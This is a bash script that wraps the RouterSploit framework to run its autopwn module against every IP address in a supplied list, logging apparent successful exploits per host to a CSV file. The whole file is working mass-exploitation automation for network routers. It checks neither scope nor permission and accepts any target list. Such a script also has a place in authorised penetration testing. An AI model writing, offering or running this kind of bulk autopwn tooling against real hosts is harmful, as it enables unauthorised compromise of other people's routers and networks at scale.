#!/bin/bash

# Ensure an input file is specified
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <ip_list_file.txt>"
    exit 1
fi

IP_LIST_FILE=$1
OUTPUT_CSV="routersploit_results.csv"

# Check if file exists
if [ ! -f "$IP_LIST_FILE" ]; then
    echo "File $IP_LIST_FILE not found!"
    exit 1
fi

# Create or overwrite the CSV file with headers
echo "IP Address,Successful Exploit" > "$OUTPUT_CSV"

# Loop through each IP in the list
while IFS= read -r IP; do
    if [[ -n "$IP" ]]; then
        echo "Running autopwn on $IP..."

        # Run routersploit autopwn for each IP and capture output in a variable
        OUTPUT=$(echo -e "use scanners/autopwn\nset target $IP\nrun\nexit\n" | routersploit 2>&1)

        # Check for success indications in the output (assuming "success" indicates exploitation)
        echo "$OUTPUT" | grep -i "success" | while read -r line ; do
            # Append the IP and successful exploit details to CSV file
            echo "\"$IP\",\"$line\"" >> "$OUTPUT_CSV"
        done

        echo "Results for $IP saved to $OUTPUT_CSV"
    fi
done < "$IP_LIST_FILE"

echo "Autopwn complete for all IPs. Results saved in $OUTPUT_CSV."
